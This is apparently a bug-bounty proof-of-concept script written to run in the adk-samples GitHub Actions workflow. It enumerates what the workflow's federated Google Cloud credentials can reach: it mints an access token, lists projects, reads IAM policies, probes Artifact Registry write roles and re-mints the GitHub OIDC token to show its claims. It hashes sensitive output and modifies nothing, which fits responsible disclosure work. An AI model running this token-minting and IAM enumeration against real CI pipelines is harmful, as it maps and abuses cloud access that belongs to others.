#!/usr/bin/env python3
"""
Read-only post-auth enumeration for OSS VRP follow-up on adk-samples.

SAFETY:
  - Workflow logs on public repos are world-readable.
  - Sensitive outputs (SA emails, member lists, full IAM policies) are
    HASHED, not printed. Only structural metadata (counts, role-name lists
    without members) is logged.
  - No data is exfiltrated, no GCP resources are modified.
  - All commands are read-only metadata reads.
  - Triagers with repo access can re-run this workflow to see verbose
    contents, or contact the reporter via the VRP private channel.
"""
import base64
import hashlib
import json
import os
import subprocess
import sys
import urllib.request


def hash_str(s: str) -> str:
    return hashlib.sha256(s.encode("utf-8", errors="replace")).hexdigest()[:16]


def run_capture(cmd: str, timeout: int = 60) -> str:
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return (r.stdout + r.stderr)
    except Exception as e:
        return f"ERROR: {e}"


def report_redacted(label: str, output: str) -> None:
    print(f"\n--- {label} ---")
    print(f"  output_sha256_prefix: {hash_str(output)}")
    print(f"  output_byte_length: {len(output)}")
    print(f"  output_line_count: {len(output.splitlines())}")


print("=" * 64)
print("[PoC FOLLOWUP] adk-samples — read-only access boundary enumeration")
print("Public-log safety: sensitive contents HASHED, not printed.")
print(f"Repo:        {os.environ.get('GITHUB_REPOSITORY')}")
print(f"Run ID:      {os.environ.get('GITHUB_RUN_ID')}")
print(f"Event:       {os.environ.get('GITHUB_EVENT_NAME')}")
print(f"Actor:       {os.environ.get('GITHUB_ACTOR')}")
print(f"Project env: {os.environ.get('CLOUDSDK_CORE_PROJECT')}")
creds = os.environ.get("GOOGLE_APPLICATION_CREDENTIALS", "")
print(f"Creds path:  {creds}")
print(f"Creds size:  {os.path.getsize(creds) if creds and os.path.exists(creds) else 'N/A'}")
print("=" * 64)

# ---------------------------------------------------------------------------
# 1. Token-mint proof — show that WIF actually exchanges for an access token.
#    Print only length + boolean, never the token itself.
# ---------------------------------------------------------------------------
print("\n--- [1] Token mint via WIF (length only) ---")
tok_out = run_capture("gcloud auth application-default print-access-token 2>/dev/null").strip()
print(f"  access_token_length:  {len(tok_out)}")
print(f"  mint_succeeded:       {len(tok_out) > 50}")
# Hashed prefix — proves to triagers we got a real token without disclosing it
print(f"  token_sha256_prefix:  {hash_str(tok_out) if tok_out else 'N/A'}")

# ---------------------------------------------------------------------------
# 2. SA identity — hashed (the email is sensitive metadata)
# ---------------------------------------------------------------------------
sa_out = run_capture('gcloud config list account --format="value(core.account)" 2>&1').strip()
report_redacted("[2] SA identity (hashed)", sa_out)
# Also dump auth list metadata (status only)
al_out = run_capture("gcloud auth list 2>&1")
report_redacted("[2b] gcloud auth list (hashed)", al_out)

# ---------------------------------------------------------------------------
# 3. Accessible projects — count only, no IDs printed
# ---------------------------------------------------------------------------
proj_out = run_capture('gcloud projects list --format="value(projectId)" 2>&1')
proj_lines = [ln for ln in proj_out.strip().splitlines() if ln.strip()]
print("\n--- [3] Accessible projects (count + hash, no IDs) ---")
print(f"  project_count: {len(proj_lines)}")
print(f"  list_sha256_prefix: {hash_str(proj_out)}")

# ---------------------------------------------------------------------------
# 4. IAM policy on adk-devops (already disclosed in original report).
#    Print: binding count + distinct role-name list (no members).
#    Role names are public GCP identifiers; members would be sensitive.
# ---------------------------------------------------------------------------
iam_out = run_capture(
    "gcloud projects get-iam-policy adk-devops --format=json 2>&1"
)
report_redacted("[4] adk-devops IAM policy (full hash)", iam_out)
try:
    iam = json.loads(iam_out)
    bindings = iam.get("bindings", [])
    roles = sorted({b.get("role", "?") for b in bindings})
    members_count = sum(len(b.get("members", [])) for b in bindings)
    print(f"  binding_count:  {len(bindings)}")
    print(f"  member_count:   {members_count}")
    print(f"  distinct_roles: {len(roles)}")
    for r in roles:
        print(f"    role: {r}")
except Exception as e:
    print(f"  parse_error_or_no_access: {e}")

# ---------------------------------------------------------------------------
# 5. Artifact Registry IAM — does the SA have write/admin on starter-pack?
#    Read-only metadata. If write perm exists, this is supply-chain RCE
#    across the agent-starter-pack ecosystem.
# ---------------------------------------------------------------------------
ar_out = run_capture(
    "gcloud artifacts repositories get-iam-policy starter-pack "
    "--location=europe-west4 --project=production-ai-template "
    "--format=json 2>&1"
)
report_redacted(
    "[5] AR IAM starter-pack@production-ai-template (full hash)", ar_out
)
try:
    ar_iam = json.loads(ar_out)
    bindings = ar_iam.get("bindings", [])
    roles = sorted({b.get("role", "?") for b in bindings})
    write_roles = [
        r for r in roles
        if any(x in r.lower() for x in ("write", "admin", "create", "owner"))
    ]
    print(f"  binding_count:    {len(bindings)}")
    print(f"  distinct_roles:   {len(roles)}")
    print(f"  write_role_count: {len(write_roles)}")
    for r in roles:
        marker = "  [WRITE]" if r in write_roles else ""
        print(f"    role: {r}{marker}")
except Exception as e:
    print(f"  parse_error_or_no_access: {e}")

# Try to list repos in production-ai-template (count only)
ar_repos_out = run_capture(
    "gcloud artifacts repositories list --project=production-ai-template "
    '--format="value(name)" 2>&1'
)
ar_repo_lines = [ln for ln in ar_repos_out.strip().splitlines() if ln.strip()]
print(f"\n--- [5b] AR repos accessible in production-ai-template ---")
print(f"  repo_count: {len(ar_repo_lines)}")
print(f"  list_sha256_prefix: {hash_str(ar_repos_out)}")

# ---------------------------------------------------------------------------
# 6. OIDC JWT claim dump — re-mint the GitHub OIDC token for an arbitrary
#    audience and print the trust-relevant claims. These claims are
#    deterministic for this repo+workflow and reveal what other federated
#    services (AWS IAM, Vault, npm provenance, Azure, etc.) would trust if
#    misconfigured to accept this repo's tokens.
# ---------------------------------------------------------------------------
oidc_url = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", "")
oidc_tok = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN", "")
if oidc_url and oidc_tok:
    print("\n--- [6] OIDC JWT claims (audience=oss-vrp-poc) ---")
    try:
        req = urllib.request.Request(
            f"{oidc_url}&audience=oss-vrp-poc",
            headers={"Authorization": f"Bearer {oidc_tok}"},
        )
        body = urllib.request.urlopen(req, timeout=15).read()
        jwt = json.loads(body)["value"]
        payload_b64 = jwt.split(".")[1]
        # pad
        payload_b64 += "=" * (-len(payload_b64) % 4)
        claims = json.loads(base64.urlsafe_b64decode(payload_b64))
        for k in (
            "iss", "aud", "sub", "repository", "repository_owner",
            "repository_owner_id", "repository_id", "workflow", "workflow_ref",
            "ref", "ref_type", "head_ref", "base_ref", "event_name",
            "actor", "actor_id", "job_workflow_ref", "runner_environment",
        ):
            if k in claims:
                print(f"  {k}: {claims[k]}")
    except Exception as e:
        print(f"  ERROR: {e}")
else:
    print("\n--- [6] OIDC JWT claims --- SKIPPED (env vars not present)")

print("\n" + "=" * 64)
print("[PoC FOLLOWUP] END")
print("No data exfiltrated. No resources modified. No tokens leaked.")
print("Sensitive contents are hashed; structural metadata only is logged.")
print("Triagers may re-run this workflow to view verbose outputs, or")
print("contact reporter via the VRP private channel for raw logs.")
print("=" * 64)
